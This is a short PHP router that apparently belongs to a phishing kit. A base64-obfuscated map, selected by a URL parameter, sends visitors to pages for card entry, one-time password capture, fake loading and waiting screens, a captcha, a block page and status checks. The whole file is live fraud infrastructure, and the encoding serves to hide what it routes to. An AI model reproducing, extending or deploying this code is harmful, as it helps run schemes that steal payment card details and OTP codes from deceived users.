<?php
$_r = base64_decode('MT1ob21lL2xhbmQucGhwfDI9aG9tZS9jYXJkLnBocHwzPWhvbWUvb3RwLnBocHw0PWhvbWUvbG9hZGluZy5waHB8NT1ob21lL3dhaXQucGhwfDY9aG9tZS9leGl0LnBocHx2PWhvbWUvY2FwdGNoYS5waHB8ZT1ob21lL2Jsb2NrZWQucGhwfHA9aG9tZS9wb3N0LnBocHxjPWhvbWUvY2hlY2tfc3RhdHVzLnBocA==');
$_m = [];
foreach (explode('|', $_r) as $_e) {
    list($_k, $_v) = explode('=', $_e);
    $_m[$_k] = $_v;
}

$_p = $_GET['s'] ?? '1';

if (isset($_m[$_p])) {
    $_f = __DIR__ . '/' . $_m[$_p];
    if (file_exists($_f)) {
        include $_f;
        exit;
    }
}

include __DIR__ . '/home/land.php';
?>
